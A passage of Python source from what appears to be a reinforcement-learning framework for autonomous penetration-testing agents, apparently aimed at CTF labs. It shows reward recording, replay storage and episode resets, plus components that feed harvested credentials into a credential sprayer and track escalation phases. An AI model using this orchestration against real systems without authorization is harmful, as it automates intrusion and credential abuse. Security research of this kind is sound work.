                    # Phase 16.0: Progress delta for priority scoring
                    progress_delta=(
                        self._p16_progress_estimate.delta
                        if self._p16_progress_estimate else 0.0
                    ),
                )
                if not hasattr(self, '_p15_consolidation_samples'):
                    self._p15_consolidation_samples = []
                self._p15_consolidation_samples.append(_cs)
            except Exception as e:
                logger.debug(f"[P15] Consolidation sample collection failed: {e}")

        # ─── PHASE 15.0: Working memory update on discoveries ───────
        if self._p15_working_memory is not None and new_discoveries:
            try:
                _disc_types = list(new_discoveries.keys())[:3]
                _disc_summary = ", ".join(f"{k}={len(v) if isinstance(v, list) else 1}"
                                          for k, v in list(new_discoveries.items())[:4])
                self._p15_working_memory.push(
                    key=f"disc_s{getattr(self, '_ppo_step_count', 0)}",
                    content=f"Found: {_disc_summary}",
                    slot_type="evidence",
                    priority=0.9,
                    ttl_steps=10,
                )
            except Exception as e:
                logger.debug(f"[P15] WM discovery push failed: {e}")

        # ─── PHASE 15.0: Semantic index — index commands ────────────
        if self._p15_semantic_index is not None:
            try:
                _si_phase = decision.phase.name if hasattr(decision.phase, 'name') else str(decision.phase)
                self._p15_semantic_index.add(
                    text=decision.command[:200],
                    entry_type="command",
                    step=getattr(self, '_ppo_step_count', 0),
                    reward=breakdown.total,
                    phase=_si_phase,
                )
                if new_discoveries:
                    _si_disc_text = ", ".join(
                        f"{k}={len(v) if isinstance(v, list) else v}"
                        for k, v in list(new_discoveries.items())[:5]
                    )
                    self._p15_semantic_index.add(
                        text=f"discovery: {_si_disc_text}",
                        entry_type="discovery",
                        step=getattr(self, '_ppo_step_count', 0),
                        reward=breakdown.total,
                        phase=_si_phase,
                    )
            except Exception as e:
                logger.debug(f"[P15] Semantic index record failed: {e}")

        # Phase 6.4: Detect "not found" tools and mask them from future PPO selection.
        # If a tool doesn't exist on the target, it will NEVER work — don't keep trying.
        if raw_output:
            _out_lower = raw_output.lower().strip()
            if ("not found" in _out_lower or "command not found" in _out_lower
                    or "could not open" in _out_lower):
                # Extract the tool name (first word of command)
                _tool = decision.command.split()[0] if decision.command else ""
                if _tool and not hasattr(self, '_failed_tools'):
                    self._failed_tools = set()
                if _tool:
                    self._failed_tools.add(_tool)
                    logger.debug(
                        f"[{self.agent_name}] Tool '{_tool}' failed — "
                        f"masked from future PPO selection"
                    )
        
        # Record outcome for adaptive mentor policy learning
        self.mentor_policy.record_outcome(
            agent_name=self.agent_name,
            reward=breakdown.total,
            used_mentor=decision.mentor_call,
        )
        
        # Phase 6.2: Record outcome with MentorController
        if self.mentor_controller is not None:
            self.mentor_controller.record_outcome(breakdown.total)

        # ─── Phase 10.0: Cloud role — DAggerCorrector on poor rewards ───
        if (
            self._dagger_corrector
            and self._dagger_corrector.can_call()
            and breakdown.total < -5.0
            and decision.source == "ppo"
        ):
            try:
                state_desc = f"Phase: {decision.phase}, discoveries: {len(new_discoveries or {})}"
                available = [
                    t.name for t in get_valid_commands_for_state(
                        self.attack_context.state_flags if self.attack_context else {},
                        self.attack_context.current_phase if self.attack_context else None
                    )[:10]
                ]
                correction = self._dagger_corrector.get_correction(  # type: ignore[attr-defined]
                    state_description=state_desc,
                    ppo_action=decision.command[:100],
                    ppo_reward=breakdown.total,
                    phase=str(decision.phase),
                    available_commands=available,
                )
                if correction:
                    logger.info(
                        f"[CLOUD-ROLE][{self.agent_name}] DAgger correction: "
                        f"'{correction.get('expert_command', '')[:60]}'"
                    )
            except Exception as e:
                logger.debug(f"DAgger correction failed: {e}")

        # ─── PHASE 42: DAgger buffer store ──────────────────────────
        dagger_buf = self._ensure_dagger_buffer()
        if dagger_buf is not None:
            try:
                _mentor_suggestion = getattr(decision, '_mentor_suggestion', None)
                if _mentor_suggestion and decision.source == "mentor":
                    dagger_buf.store(
                        state_hash=getattr(self, '_current_state_hash', ''),
                        state_vector=[0.0] * 10,
                        mentor_action_idx=0,
                        mentor_command=decision.command[:200] if decision.command else "",
                        policy_action_idx=0,
                        policy_command="",
                        mentor_confidence=0.8,
                        phase=str(decision.phase),
                        episode=getattr(self, 'current_episode', 0),
                        step=getattr(self, '_ppo_step_count', 0),
                    )
            except Exception as e:
                logger.warning("DAgger store failed: %s", e)

        # ─── PHASE 42: CTF mode — scan for captured flags ───────────
        ctf = self._ensure_ctf_tracker()
        if ctf is not None and raw_output:
            try:
                flags = ctf.scan_output(raw_output, decision.command or "", self.agent_name)
                if flags:
                    from rich.console import Console as _RichConsole
                    _ctf_console = _RichConsole()
                    for flag in flags:
                        _ctf_console.print(f"[bold green]FLAG CAPTURED:[/] {flag}")
                        logger.info("CTF flag captured: %s (agent=%s)", flag, self.agent_name)
            except Exception as e:
                logger.warning("CTFModeTracker scan failed: %s", e)

        # ─── PHASE 42: Credential sprayer — register discovered creds/services ──
        sprayer = self._ensure_cred_sprayer()
        if sprayer is not None and new_discoveries:
            try:
                if isinstance(new_discoveries, dict):
                    if "credentials" in new_discoveries:
                        creds = new_discoveries["credentials"]
                        cred_list = creds if isinstance(creds, list) else [creds]
                        for cred in cred_list:
                            if isinstance(cred, dict):
                                sprayer.register_credential(
                                    username=cred.get("username", ""),
                                    password=cred.get("password", ""),
                                    source=cred.get("source", ""),
                                )
                            elif isinstance(cred, str) and ":" in cred:
                                parts = cred.split(":", 1)
                                sprayer.register_credential(
                                    username=parts[0], password=parts[1],
                                )
                    if "services" in new_discoveries:
                        svcs = new_discoveries["services"]
                        svc_list = svcs if isinstance(svcs, list) else [svcs]
                        for svc in svc_list:
                            if isinstance(svc, dict):
                                sprayer.register_service(
                                    host=svc.get("host", ""),
                                    port=svc.get("port", 0),
                                    service=svc.get("service", ""),
                                )
            except Exception as e:
                logger.warning("CredentialSprayer registration failed: %s", e)

        # ─── Phase 8.0: Record to cross-episode chain memory ────────
        if decision.command:
            self._record_chain_step(decision.command, breakdown.total)
            # Store failures for reasoning context
            if not success and decision.template_name:
                fail_reason = f"{decision.template_name}: {'not found' if 'not found' in (raw_output or '').lower() else 'failed'}"
                self._reasoning_failures.append(fail_reason)
                if len(self._reasoning_failures) > 10:
                    self._reasoning_failures = self._reasoning_failures[-10:]

        # ─── PHASE 4: Pair PPO trajectory entry with reward ─────────
        # STRUCTURAL REWRITE: All learners receive the same unified reward.
        # Per-algorithm bonuses (conformity, DAgger, macro-align, reasoning,
        # RND) are REMOVED. UnifiedRewardPipeline.total is the single scalar.
        if self._ppo_pending is not None:
            # Use unified reward if available, else fallback to breakdown.total
            ppo_reward = _unified_reward.total if _unified_reward is not None else breakdown.total
            
            # ── Phase 13.0: Auto-promote high-reward mentor commands to SkillLibrary ──
            # When a mentor-suggested command produces reward > 5.0, it's a proven
            # tactic. Automatically create a SkillCard so the agent can use it
            # autonomously in future episodes without needing the mentor.
            if (
                decision.source == "mentor"
                and decision.template_name
                and breakdown.total > 5.0
                and self.skill_library is not None
            ):
                try:
                    from core.postmortem.orion_postmortem import SkillCard
                    _phase_name = decision.phase.name if decision.phase else "RECON"
                    _skill_id = f"auto_{self.agent_name}_{decision.template_name}_{_phase_name}"
                    _skill = SkillCard(
                        id=_skill_id,
                        if_condition=f"phase={_phase_name}, agent={self.agent_name}",
                        then_action=decision.command[:200],
                        parameters_template=decision.params or {},
                        confidence=min(0.85, breakdown.total / 20.0),  # Scale confidence by reward
                        evidence_refs=[f"auto-promoted:reward={breakdown.total:.1f}"],
                    )
                    if self.skill_library.promote(_skill, reason=f"Phase 13.0 auto-promote: reward={breakdown.total:.1f}"):
                        logger.info(
                            f"[SKILL-AUTO][{self.agent_name}] Promoted mentor command "
                            f"'{decision.template_name}' → SkillCard (reward={breakdown.total:.1f})"
                        )
                except Exception as e:
                    logger.debug(f"Auto-promote failed: {e}")
            
            # R69: Tag trajectory entry with discovery + template metadata for HTR
            _r69_disc_types = []
            if new_discoveries:
                for _dt, _dv in new_discoveries.items():
                    if isinstance(_dv, list):
                        _r69_disc_types.extend([_dt] * len(_dv))
                    else:
                        _r69_disc_types.append(_dt)

            # STRUCTURAL REWRITE: RND intrinsic is already folded into
            # unified_reward.total. No separate PPO RND injection needed.
            # Populate reward composition on packet for telemetry only.
            _dp = self._current_decision_packet
            if _dp is not None and hasattr(_dp, 'rnd') and _dp.rnd.valid:
                _dp.reward.intrinsic_rnd = _dp.rnd.intrinsic_reward
                _dp.reward.extrinsic = breakdown.total

            self._ppo_trajectory.append({
                "state": self._ppo_pending["state"],
                "action": self._ppo_pending["action"],
                "log_prob": self._ppo_pending["log_prob"],
                "value": self._ppo_pending["value"],
                "reward": ppo_reward,
                "done": done,
                # R69 HTR metadata (not consumed by PPO directly)
                "_r69_discoveries": _r69_disc_types,
                "_r69_template": decision.template_name or "",
                "_r69_preconditions": set(
                    (decision.template_name and COMMAND_REGISTRY.get(decision.template_name) or None)
                    and COMMAND_REGISTRY[decision.template_name].preconditions or set()
                ) if decision.template_name else set(),
                # Phase 37: Teacher data for KL + ranking loss
                "teacher_distribution": self._ppo_pending.get("teacher_distribution"),
                "teacher_action": self._ppo_pending.get("teacher_action"),
            })
            self._ppo_pending = None

            # Phase 37: Record step outcome for LLM bridge anneal
            if self._p37_llm_bridge is not None:
                _disc_count = len(_r69_disc_types) if _r69_disc_types else 0
                self._p37_llm_bridge.record_step_outcome(
                    reward=ppo_reward,
                    discoveries=_disc_count,
                    exploit_success=bool(new_discoveries and (
                        'shell' in new_discoveries or 'credential' in new_discoveries
                    )),
                )

        # ─── C03: SAC off-policy transition storage + update ────────
        # SAC is off-policy: store ALL transitions (regardless of who won)
        # and update every step for maximum sample efficiency.
        if self._sac_pending is not None and self.sac_agent is not None:
            try:
                import torch as _t_sac
                from core.models.state_encoder import encode_state as _enc_sac
                # Encode next state from current attack context
                # Note: record_result() doesn't have step_ctx, so we use
                # self.attack_context and trajectory length for step number.
                _sac_next_state_dict = {
                    "state_flags": dict(self.attack_context.state_flags) if self.attack_context else {},
                    "phase": (
                        self.attack_context.current_phase.name
                        if self.attack_context else "RECON"
                    ),
                }
                _sac_step_num = len(self._ppo_trajectory) if self._ppo_trajectory else 1
                _sac_next_st = _enc_sac(
                    _sac_next_state_dict, _t_sac.device("cpu"),
                    current_step=_sac_step_num + 1,
                    max_steps=500,
                )
                # STRUCTURAL REWRITE: Unified reward for all learners
                _sac_reward = _unified_reward.total if _unified_reward is not None else breakdown.total

                self.sac_agent.store_transition(
                    state=self._sac_pending["state"],
                    action=self._sac_pending["action"],
                    reward=_sac_reward,
                    next_state=_sac_next_st,
                    done=done,
                )
                # Off-policy update every step
                _sac_metrics = self.sac_agent.update()
                if _sac_metrics and _sac_metrics.get("critic_loss", 0) > 0:
                    logger.debug(
                        f"[SAC][{self.agent_name}] Update #{self.sac_agent._update_count}: "
                        f"π={_sac_metrics.get('actor_loss', 0):.4f} "
                        f"Q={_sac_metrics.get('critic_loss', 0):.4f} "
                        f"α={_sac_metrics.get('alpha', 0):.4f} "
                        f"H={_sac_metrics.get('entropy', 0):.4f}"
                    )
            except Exception as e:
                logger.debug(f"[SAC][{self.agent_name}] Transition failed: {e}")
            self._sac_pending = None
        
        # ─── PHASE 9.0: Store DDQN macro transition ────────────────
        if self._ddqn_pending is not None and self.ddqn_macro is not None:
            try:
                import torch as _torch
                _, _, _, encode_state = _lazy_ppo()
                if encode_state is not None:
                    # Encode next state from current attack context
                    next_state_dict = {
                        "state_flags": dict(self.attack_context.state_flags) if self.attack_context else {},
                    }
                    next_state = encode_state(next_state_dict, _torch.device("cpu"))
                    
                    from core.algorithms.ddqn_macro import compute_macro_reward
                    phase_name = (
                        self.attack_context.current_phase.name
                        if self.attack_context and self.attack_context.current_phase
                        else "RECON"
                    )
                    prev_phase_name = None
                    if hasattr(self, '_last_phase') and self._last_phase is not None:
                        prev_phase_name = (
                            self._last_phase.name
                            if hasattr(self._last_phase, 'name')
                            else str(self._last_phase)
                        )
                    
                    macro_reward = compute_macro_reward(
                        macro=self._active_macro,  # type: ignore[arg-type]
                        step_reward=_unified_reward.total if _unified_reward is not None else breakdown.total,
                        phase_name=phase_name,
                        discoveries=new_discoveries or {},
                        prev_phase=prev_phase_name,
                        prev_macro=self._ddqn_pending.get("prev_macro"),  # R57 Layer 1
                    )
                    
                    # R57 Layer 1: Record macro outcome for success tracking
                    _had_disc = bool(new_discoveries)
                    self.ddqn_macro.record_macro_outcome(
                        self._ddqn_pending["macro"], macro_reward, _had_disc,
                    )
                    
                    self.ddqn_macro.store_transition(
                        state=self._ddqn_pending["state"],
                        macro=self._ddqn_pending["macro"],
                        reward=macro_reward,
                        next_state=next_state,
                        done=done,
                    )
                    # Update DDQN (off-policy, can update every step)
                    self.ddqn_macro.update()
            except Exception as e:
                logger.debug(f"[DDQN][{self.agent_name}] Transition store failed: {e}")
            self._ddqn_pending = None
        
        # ─── C04: CognitionNode observe — re-enabled with bug fixes ───
        if self.cognition_node is not None and self._cognition_result is not None:
            try:
                import torch as _cog_t
                from core.models.state_encoder import encode_state as _cog_enc
                _cog_next = _cog_enc(
                    {"state_flags": dict(self.attack_context.state_flags) if self.attack_context else {},
                     "phase": self.attack_context.current_phase.name if self.attack_context else "RECON"},
                    _cog_t.device("cpu"),
                    current_step=len(self._ppo_trajectory) if self._ppo_trajectory else 1,
                    max_steps=500,
                )
                _cog_reward = _unified_reward.total if _unified_reward is not None else breakdown.total
                self.cognition_node.observe(
                    self._cognition_result, _cog_reward, _cog_next, done,
                )
            except Exception as e:
                logger.debug(f"[COGNITION][{self.agent_name}] Observe failed: {e}")
        self._cognition_result = None
        
        # ─── PHASE 8: Tick persona cooldowns ───
        if self.persona_router is not None:
            try:
                self.persona_router.tick_cooldowns()
            except Exception:
                pass

        # ─── Phase 9.1: Store transition to HybridMemory ───────────────
        # Mirrors all transitions to the unified 3-tier memory so PPO, SAC,
        # DDQN, and CognitionNode can sample from a shared replay buffer.
        hm = self._get_hybrid_memory()
        if hm is not None:
            try:
                import torch as _hm_torch
                _, _, _, encode_state = _lazy_ppo()
                if encode_state is not None:
                    _hm_state_dict = {
                        "state_flags": dict(self.attack_context.state_flags) if self.attack_context else {},
                    }
                    _hm_state = encode_state(_hm_state_dict, _hm_torch.device("cpu"))
                    _hm_state_np = _hm_state.detach().cpu().numpy().flatten()

                    # Action index: use PPO action if available, else hash command
                    _hm_action = 0
                    if self._ppo_trajectory and self._ppo_trajectory[-1].get("action") is not None:
                        _hm_action = int(self._ppo_trajectory[-1]["action"])
                    elif decision.command:
                        _hm_action = hash(decision.command) % 256

                    hm.store_transition(
                        state=_hm_state_np,
                        action=_hm_action,
                        reward=_unified_reward.total if _unified_reward is not None else breakdown.total,
                        next_state=_hm_state_np,  # Current state (next will overwrite on next step)
                        done=done,
                        metadata={
                            "agent_id": self.agent_name,
                            "source": decision.source or "unknown",
                            "command": decision.command or "",
                            "template": decision.template_name or "",
                            "phase": (self.attack_context.current_phase.name
                                      if self.attack_context and self.attack_context.current_phase
                                      else "RECON"),
                        },
                        priority=abs(_unified_reward.total if _unified_reward is not None else breakdown.total) + 0.01,
                    )
            except Exception as e:
                logger.debug(f"[HYBRID_MEM][{self.agent_name}] store failed: {e}")
        
        return breakdown
    
    # =====================================================================
    # PHASE 5.2+: ADAPTIVE CURRICULUM HELPERS
    # =====================================================================

    def _get_curriculum_performance(self) -> float:
        """Compute adaptive curriculum performance score (0-1).

        Combines recent discovery rate, diversity, and reward trend.
        Higher score → agent is learning well → less playbook guidance needed.
        """
        if not self._episode_rewards:
            return 0.5  # Neutral: no history yet

        window = self._adaptive_history_window
        recent_rewards = self._episode_rewards[-window:]
        recent_discoveries = self._episode_discovery_counts[-window:]
        recent_diversity = self._episode_diversity_ratios[-window:]

        scores = []

        # Discovery rate (0-1): avg discoveries per episode, capped at 15
        if recent_discoveries:
            avg_disc = sum(recent_discoveries) / len(recent_discoveries)
            scores.append(min(avg_disc / 15.0, 1.0))

        # Diversity ratio (0-1): already in range
        if recent_diversity:
            scores.append(sum(recent_diversity) / len(recent_diversity))

        # Reward trend (0-1): positive trend = doing well
        if len(recent_rewards) >= 3:
            first_half = sum(recent_rewards[: len(recent_rewards) // 2])
            second_half = sum(recent_rewards[len(recent_rewards) // 2 :])
            if first_half > 0:
                trend = min(max(second_half / first_half, 0.0), 2.0) / 2.0
            else:
                trend = 0.5 if second_half >= 0 else 0.2
            scores.append(trend)

        return sum(scores) / len(scores) if scores else 0.5

    def record_episode_performance(
        self,
        total_reward: float,
        discovery_count: int,
        diversity_ratio: float,
    ):
        """Record episode-level metrics for adaptive curriculum.

        Called by SmartOrchestrator at the end of each episode.
        """
        self._episode_rewards.append(total_reward)
        self._episode_discovery_counts.append(discovery_count)
        self._episode_diversity_ratios.append(diversity_ratio)

        # Keep bounded history
        cap = self._adaptive_history_window * 3
        if len(self._episode_rewards) > cap:
            self._episode_rewards = self._episode_rewards[-cap:]
            self._episode_discovery_counts = self._episode_discovery_counts[-cap:]
            self._episode_diversity_ratios = self._episode_diversity_ratios[-cap:]

    def reset_episode(self, episode: int):
        """Reset for new episode."""
        self.current_episode = episode
        self.mentor_policy.reset_episode(episode)
        self.reward_calculator.reset()

        # Phase 9.1: Signal HybridMemory episode start
        hm = self._get_hybrid_memory()
        if hm is not None:
            try:
                hm.start_episode(episode)
            except Exception:
                pass
        
        # Reset episode-level command tracking for variety
        self.episode_used_commands.clear()
        self.command_repeat_count.clear()

        # C06: Log source win-rate summary before clearing decisions
        # C07: Gated by FF_SOURCE_WIN_RATE
        from core.feature_flags import get_feature_flags as _get_ff
        if _get_ff().source_win_rate_flag and self.decisions:
            _best = self.source_win_rate.get_best_source()
            if _best:
                logger.debug(
                    f"[SRC-EMA][{self.agent_name}] Best source: {_best} "
                    f"(ema={self.source_win_rate.get_win_rate(_best):.3f})"
                )

        self.decisions.clear()  # Clear decision history for fresh episode
        
        # Phase 4: Reset PPO trajectory
        self._ppo_trajectory.clear()
        self._ppo_pending = None
        
        # Phase 6.1: Reset stagnation counter
        self._stagnation_steps = 0
        self._last_phase = None

        # Layer 3: Reset codex meta-layer counters
        self._codex_meta_calls_episode = 0
        self._codex_meta_cooldown = 0
        self._codex_meta_phase_steps = 0
        self._codex_meta_last_phase = None
        self._codex_meta_gate_overrides = 0  # R60
        self._codex_meta_antirepeat_hits = 0  # R60
        self._codex_meta_used_templates.clear()  # R62: Reset per-episode dedup

        # R66: Reset codex strategic counters
        self._codex_strategic_calls_episode = 0
        self._codex_strategic_cooldown = 0
        self._r66_coherence = 0.5
        self._r66_macro_conf = 0.5

        # R67: Reset velocity + adaptive budget
        self._r67_velocity = 0.0
        self._r67_stalling = False
        self._r67_codex_bonus_budget = 0

        # R68: Reset phase-group override
        self._r68_forced_phase_group = None

        # R49/R52: Reset phase-stuck escalation trackers
        self._privesc_steps = 0
        self._lateral_steps = 0
        self._privesc_escalation_fired = False
        self._escalation_attempt_count = 0  # R53: Reset alternating escalation counter

        # R42: Reset forced-novel counter per episode
        self._forced_novel_count = 0

        # Phase 6.9.6: Reset reasoning context trackers
        self._reasoning_step_rewards: List[float] = []
        self._reasoning_highest_reward: float = 0.0
        self._reasoning_last_discovery_step: int = 0
        self._reasoning_ppo_decisions: int = 0
        self._reasoning_anti_repeat_decisions: int = 0
        self._reasoning_total_decisions: int = 0
        self._reasoning_failed_commands: int = 0
        self._reasoning_total_commands: int = 0

        # Phase 6.9.1: Reset closeout tracking
        self._closeout_used_templates: set = set()
        
        # Phase 6.4: Reset failed tools (tools not installed on target)
        # NOTE: _failed_tools persists across episodes intentionally —
        # if a tool isn't installed, it won't be next episode either.
        # Only reset on explicit call.
        if not hasattr(self, '_failed_tools'):
            self._failed_tools: set = set()
        
        # R47 Fix #4: Reset SSH failure tracking per episode
        # When SSH consistently fails (key exchange, connection closed),
        # we skip sshpass alternatives in anti-repeat pool
        self._ssh_failures_this_episode: int = 0
        
        # Web path follow-up: reset explored paths per episode
        self._explored_web_paths: set = set()
        self._explored_web_path_ids: set = set()
        self._explored_web_path_html: set = set()
        self._explored_web_path_downloads: set = set()
        
        # C04: Reset CognitionNode + PersonaRouter per episode
        self._cognition_result = None
        if self.cognition_node is not None:
            try:
                self.cognition_node.reset_episode()
            except Exception:
                pass
        if self.persona_router is not None:
            try:
                self.persona_router.reset_episode()
            except Exception:
                pass
        
        # ─── PHASE 15.0: Reset Neurovortex per-episode state ───────
        if self._p15_working_memory is not None:
            self._p15_working_memory.clear()
        if self._p15_sensory_buffer is not None:
            self._p15_sensory_buffer.clear()
        if self._p15_neuromod_history is not None:
            self._p15_neuromod_history.clear()
        if self._p15_aggression_history is not None:
            self._p15_aggression_history.clear()
        self._p15_aggression_level = 0.3
        if self._p15_neuromod_state is not None:
            from core.neuro.neuromodulators import NeuromodulatorState
            self._p15_neuromod_state = NeuromodulatorState()
        if self._p15_semantic_index is not None:
            self._p15_semantic_index.clear()
        # Consolidation samples collected during episode
        self._p15_consolidation_samples: list = []

        # ─── PHASE 16.0: Reset Progress Estimator per-episode state ──
        if self._p16_progress_estimator is not None:
            self._p16_progress_estimator.reset_episode()
        self._p16_progress_estimate = None
        self._p16_episode_states = []
        self._p16_episode_boards = []

        # Keep learned store (persists across episodes)
        # Reset attack context for new episode

        # ─── PHASE 42: Reset phase timeout ──────────────────────────
        if self._phase_timeout is not None:
            try:
                self._phase_timeout.reset()
            except Exception as e:
                logger.warning("PhaseTimeout reset failed: %s", e)

        if self.attack_context:
            self.attack_context = AttackContext(
                target=self.attack_context.target,
                difficulty=self.attack_context.difficulty,
                platform=self.attack_context.platform,
            )
    
    def _log_mentor_call(
        self,
        step_ctx: SmartStepContext,
        proposed_action: Optional[str],
        result: SmartDecisionResult,
    ):
        """Log mentor call to transcript file."""
        import json
        import os
        
        entry = {
            "event_id": f"{step_ctx.episode}:{step_ctx.step:04d}:{self.agent_name}",
            "agent": self.agent_name,
            "task_type": "smart_tactical",
            "template_used": result.template_name,
            "command": result.command[:100],
            "mentor_reasoning": result.mentor_reasoning[:200] if result.mentor_reasoning else None,
            "model_used": result.model_used,
            "mentor_delta": result.mentor_delta,
            "phase": result.phase.name,
            "confidence": result.confidence,
            "timestamp": result.timestamp,
        }
        
        try:
            os.makedirs(os.path.dirname(self.mentor_log_path or "logs/mentor.jsonl"), exist_ok=True)
            with open(self.mentor_log_path or "logs/mentor.jsonl", "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            logger.debug(f"Failed to log mentor call: {e}")
    
    def get_step_reasoning(self) -> List[Dict[str, str]]:
        """Get reasoning events from the last decide() call for dashboard display.
        
        Returns:
            List of {"type": str, "agent": str, "message": str} dicts.
            Types: tc_block, phase_gate, mentor_reason, codex_meta
        """
        return getattr(self, '_step_reasoning_log', [])

    def get_stats(self) -> Dict[str, Any]:
        """Get coach statistics."""
        return {
            "agent": self.agent_name,
            "total_decisions": len(self.decisions),
            "mentor_calls": sum(1 for d in self.decisions if d.mentor_call),
            "actions_changed": sum(1 for d in self.decisions if d.mentor_delta == "changed"),
            "policy_stats": self.mentor_policy.get_stats(),
            "reward_stats": self.reward_calculator.get_session_stats(),
            "learned_commands": self.learned_store.get_summary(),
        }
    
    def suggest_exploration(self) -> List[str]:
        """Get suggested commands for exploration."""
        if not self.attack_context:
            return []
        
        return self.reward_calculator.suggest_exploration(
            self.attack_context.current_phase,
            self.attack_context.state_flags,
        )
    
    def is_stuck(self) -> bool:
        """Check if agent is stuck (low recent rewards)."""
        return self.reward_calculator.is_stuck()


def create_smart_coach(
    agent_name: str,
    gpt_manager: "GPTManager",
    mentor_policy: Optional[MentorPolicy] = None,
    model: str = "local-llm",
) -> SmartCoach:
    """
    Factory function to create a SmartCoach.
    
    Args:
        agent_name: Name of the agent
        gpt_manager: GPT manager for LLM access
        mentor_policy: Optional mentor policy
        model: LLM model to use
        
    Returns:
        Configured SmartCoach instance
    """
    return SmartCoach(
        agent_name=agent_name,
        gpt_manager=gpt_manager,
        mentor_policy=mentor_policy,
        model=model,
    )


# =============================================================================
# SMARTCOACH WRAPPER - Wraps any AgentInterface for smart validation
# =============================================================================

class SmartCoachWrapper:
    """
    Wraps any agent implementing AgentInterface to add SmartCoach validation.
    
    This wrapper intercepts the act() method to:
    1. Get agent's native action proposal
    2. Validate/improve with SmartCoach + command registry
    3. Return enhanced action with reasoning
    
    All other methods pass through to the underlying agent.
    """
    
    def __init__(
        self,
        agent: Any,
        coach: SmartCoach,
        verbose: bool = False,
    ):
        """
        Initialize wrapper.
        
        Args:
            agent: Agent implementing AgentInterface (RedAgent, ScoutAgent, etc.)
            coach: SmartCoach instance for this agent
            verbose: Enable verbose logging
        """
        self._agent = agent
        self._coach = coach
        self._verbose = verbose
        self._current_episode = 0
        self._current_step = 0
        
        # Track stuck state
        self._action_history: List[str] = []
        self._stuck_threshold = 3
        
        logger.debug(f"SmartCoachWrapper initialized for {self.agent_id}")
    
    @property
    def agent_id(self) -> str:
        """Get agent ID from underlying agent."""
        return getattr(self._agent, 'agent_id', 'unknown')
    
    @property
    def role(self) -> str:
        """Get agent role from underlying agent."""
        return getattr(self._agent, 'role', 'unknown')
    
    @property
    def coach(self) -> SmartCoach:
        """Access the SmartCoach."""
        return self._coach
    
    @property
    def attack_context(self) -> Optional[AttackContext]:
        """Get attack context from coach."""
        return self._coach.attack_context
    
    def set_episode_step(self, episode: int, step: int):
        """Set current episode and step for context."""
        self._current_episode = episode
        self._current_step = step
    
    def act(self, state: Dict[str, Any]) -> Dict[str, Any]:
        """
        Enhanced act() that validates through SmartCoach.
        
        Args:
            state: Environment state dictionary
            
        Returns:
            Action result with SmartCoach enhancement
        """
        # 1. Get agent's native decision
        try:
            native_result = self._agent.act(state)
            proposed_action = native_result.get("action", "noop")
            native_confidence = native_result.get("info", {}).get("confidence", 0.5)
        except Exception as e:
            logger.warning(f"Agent {self.agent_id} native act() failed: {e}")
            native_result = {"action": "noop", "success": False, "reward": 0.0, "info": {}}
            proposed_action = "noop"
            native_confidence = 0.3
        
        # 2. Update attack context from state
        if not self._coach.attack_context:
            target = state.get("target_ip", "10.10.10.10")
            self._coach.init_attack_context(target)
        self._coach.update_context_from_state(state)
        
        # 3. Check if stuck (triggers forced mentor call)
        is_stuck = self._check_stuck(proposed_action)
        if is_stuck:
            native_confidence = 0.1  # Force mentor call
        
        # 4. Build SmartStepContext
        step_ctx = SmartStepContext(
            episode=self._current_episode,
            step=self._current_step,
            agent_name=self.agent_id,
            attack_context=self._coach.attack_context,  # type: ignore[arg-type]
            state=state,
        )
        
        # 5. Get SmartCoach decision (validates against registry, may call GPT)
        decision = self._coach.decide(step_ctx, proposed_action, native_confidence)
        
        # 6. Track action for stuck detection
        self._action_history.append(decision.command)
        if len(self._action_history) > self._stuck_threshold + 2:
            self._action_history = self._action_history[-(self._stuck_threshold + 2):]
        
        # 7. Merge: SmartCoach command + agent's specialized info
        enhanced_result = {
            "action": decision.command,
            "success": native_result.get("success", True),
            "reward": native_result.get("reward", 0.0),
            "info": {
                **native_result.get("info", {}),
                # Smart additions
                "template_name": decision.template_name,
                "template_params": decision.params,
                "mentor_call": decision.mentor_call,
                "model_used": decision.model_used,
                "mentor_reasoning": decision.mentor_reasoning,
                "mentor_delta": decision.mentor_delta,
                "phase": decision.phase.name,
                "confidence": decision.confidence,
                "smart_decision": True,
                "is_stuck": is_stuck,
            }
        }
        
        if self._verbose:
            logger.info(
                f"[{self.agent_id}] {decision.phase.name}: {decision.command[:50]}... "
                f"(mentor={decision.mentor_call}, conf={decision.confidence:.2f})"
            )
        
        return enhanced_result
    
    def _check_stuck(self, proposed_action: str) -> bool:
        """Check if agent is stuck (repeating same action)."""
        if len(self._action_history) < self._stuck_threshold:
            return False
        
        recent = self._action_history[-self._stuck_threshold:]
        # Check if all recent actions are the same
        if len(set(recent)) == 1:
            logger.warning(f"Agent {self.agent_id} STUCK: repeated '{recent[0][:40]}...'")
            return True
        
        # Also check if proposed matches all recent
        if all(a == proposed_action for a in recent):
            return True
        
        return False
    
    def record_result(
        self,
        success: bool,
        raw_output: str,
        new_discoveries: Optional[Dict[str, Any]] = None,
    ) -> RewardBreakdown:
        """
        Record result and get smart reward calculation.
        
        Args:
            success: Whether command succeeded
            raw_output: Raw output from command execution
            new_discoveries: New discoveries from output parsing
            
        Returns:
            RewardBreakdown with detailed reward calculation
        """
        if not self._coach.decisions:
            # No decision recorded yet
            return RewardBreakdown(base_reward=0.0, total=0.0)
        
        last_decision = self._coach.decisions[-1]
        return self._coach.record_result(
            decision=last_decision,
            success=success,
            raw_output=raw_output,
            new_discoveries=new_discoveries,
        )
    
    def learn(self, state, action, reward, next_state, done) -> float:
        """Pass through to underlying agent's learn()."""
        if hasattr(self._agent, 'learn'):
            return self._agent.learn(state, action, reward, next_state, done)
        return 0.0
    
    def reset(self):
        """Reset wrapper and underlying agent."""
        self._action_history.clear()
        if hasattr(self._agent, 'reset'):
            self._agent.reset()
    
    def reset_episode(self, episode: int):
        """Reset for new episode."""
        self._current_episode = episode
        self._current_step = 0
        self._action_history.clear()
        self._coach.reset_episode(episode)
    
    def get_stats(self) -> Dict[str, Any]:
        """Get combined stats from wrapper and coach."""
        return {
            "agent_id": self.agent_id,
            "role": self.role,
            "coach_stats": self._coach.get_stats(),
            "is_stuck": len(set(self._action_history[-self._stuck_threshold:])) == 1
            if len(self._action_history) >= self._stuck_threshold else False,
        }
    
    def __getattr__(self, name: str):
        """Pass through attribute access to underlying agent."""
        return getattr(self._agent, name)
